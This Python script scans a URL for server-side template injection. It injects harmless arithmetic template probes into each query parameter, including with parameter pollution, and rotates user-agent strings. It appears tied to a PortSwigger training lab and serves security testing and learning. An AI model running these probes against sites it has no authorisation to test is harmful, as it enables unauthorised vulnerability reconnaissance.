import requests


user_agents = [
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone14,6; U; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19E241 Safari/602.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36",
    "Mozilla/5.0 (CrKey armv7l 1.5.16041) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.0 Safari/537.36",
    "Mozilla/5.0 (PlayStation; PlayStation 5/2.26) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Safari/605.1.15",
]

payloads = [r'{1111*2}', r'{1111*"2"}', r'{ 1111 * 2 }', r'*{7*7}', r'{% 1111*2 %}', r'#{ 7 * 7 }', r'@(1111*2)', r'${1111*2}', r'<%= 1111 * 2 %>', r'{{1111*2}}', r'{{1111*"2"}}', r'${{1111*2}}', r'{{1111*2}}[[1111*2]]', r'{{ 1111*2 }}']

def get_param(url):
    parameter_part = url.split("?")[1]
    parameter_list = parameter_part.split("&")
    return parameter_list

def test_SSTI(url):

    #2 Test on URL parameters for GET Method
    try:
        for payload in payloads:
                i = 0
                for parameter in get_param(url):

                    parameter_value = parameter.split("=")[1]
                    new_parameter = parameter.replace(parameter_value, payload)
                    target_url = url.replace(parameter, new_parameter)
                    header = {"User-Agent": user_agents[i]}
                    i += 1
                    i %= len(user_agents)
                    response = requests.get(target_url, allow_redirects=False, headers=header, timeout=2)
                    if "2222" in response.text:
                        print(f"SSTI Detected at {target_url}")
    except:
        pass
        
    # Make parameter pollution
    try:
        for payload in payloads:
            i = 0
            for parameter in get_param(url):
                parameter_value = parameter.split("=")[1]
                new_parameter = parameter.replace(parameter_value, payload)
                target_url = url.replace(parameter, new_parameter)
                target_url1 = target_url + "&" + new_parameter # two payload in two parameters
                target_url2 = target_url + "&" + parameter # one payload in one of the two parameters
                header = {"User-Agent": user_agents[i]}
                i += 1
                i %= len(user_agents)
                response1 = requests.get(target_url1, allow_redirects=False, headers=header, timeout=2)
                response2 = requests.get(target_url2, allow_redirects=False, headers=header, timeout=2)
                if "2222" in response1.text:
                    print(f"SSTI Detected with parameter pollution at {target_url1}")
                if "2222" in response2.text:
                    print(f"SSTI Detected with parameter pollution at {target_url2}")
    except:
        pass
    

if __name__ == "__main__":
    url = str(input("URL: "))
    test_SSTI(url)

# https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic
